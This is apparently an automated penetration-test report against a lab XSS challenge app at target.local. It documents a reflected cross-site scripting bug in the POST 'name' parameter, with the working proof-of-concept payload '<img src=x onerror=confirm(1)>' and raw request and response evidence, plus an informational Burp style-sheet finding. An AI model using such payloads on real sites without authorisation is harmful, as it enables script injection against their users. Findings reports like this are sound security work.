# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected Reflected XSS via POST `name` param on /page (filter bypass)](#finding-1)
    - [2. INFO — burp Path-relative style sheet import (2 URLs)](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxe3jg0-acr10r` |
| Target | http://target.local:32788/ |
| Started | 2026-06-28T06:10:14.667Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 2 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32788`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

2 finding(s): 1 high, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] Reflected XSS via POST `name` param on /page (filter bypass)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32788/

The POST /page endpoint reflects the `name` parameter directly into the HTML response without encoding. The application has a character-filter that identifies certain blocked characters and shows a warning (e.g. "Sorry you can't use: 'c'"), but crucially still outputs the raw input into the page. The payload `<img src=x onerror=confirm(1)>` was reflected unescaped as a live HTML tag — no characters in this payload are blocked by the filter — allowing arbitrary JavaScript execution in a victim's browser when they submit or view a crafted form.

**Reproduction**

```
1. POST http://target.local:32788/page with body: name=<img src=x onerror=confirm(1)>
2. Observe the response HTML contains the tag unescaped: `<img src=x onerror=confirm(1)>` between the textarea and the submit button.
3. A browser rendering this response will trigger the onerror handler and execute confirm(1).
Note: The app's character filter is purely cosmetic — it logs the offending char but does not prevent reflection.
```

**Evidence**

- Evidence `ev-mqxe7lam-9` — `artifacts/s-0002/ev-mqxe7lam-9/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32788
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=TESTINPUT_BASELINE
```

Response:

```http
HTTP/1.1 200
content-length: 986
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:13:23 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss32.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text">Sorry you can't use: 'A'</div>
                    
                    <br>
                    <textarea name=name cols=50 rows=20 placeholder="Enter your name..."></textarea>
                    TESTINPUT_BASELINE
                    <br>
                    <input type=submit value="Submit">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxe8i3n-d` — `artifacts/s-0002/ev-mqxe8i3n-d/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32788
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%3Cimg+src%3Dx+onerror%3Dconfirm(1)%3E
```

Response:

```http
HTTP/1.1 200
content-length: 998
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:14:05 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss32.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text">Sorry you can't use: 'c'</div>
                    
                    <br>
                    <textarea name=name cols=50 rows=20 placeholder="Enter your name..."></textarea>
                    <img src=x onerror=confirm(1)>
                    <br>
                    <input type=submit value="Submit">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxe9grp-f` — `artifacts/s-0002/ev-mqxe9grp-f/`

Request:

```http
POST /page HTTP/1.1
Host: target.local:32788
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

name=%3Cimg+src%3Dx+onerror%3Dconfirm(1)%3E
```

Response:

```http
HTTP/1.1 200
content-length: 998
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 06:14:50 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss32.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text">Sorry you can't use: 'c'</div>
                    
                    <br>
                    <textarea name=name cols=50 rows=20 placeholder="Enter your name..."></textarea>
                    <img src=x onerror=confirm(1)>
                    <br>
                    <input type=submit value="Submit">
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32788/page] @ http://target.local:32788/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxee3on-p` — `artifacts/_/ev-mqxee3on-p/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32788

GET / HTTP/1.1
Host: target.local:32788
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1090
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sun, 28 Jun 2026 06:17:47 GMT


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
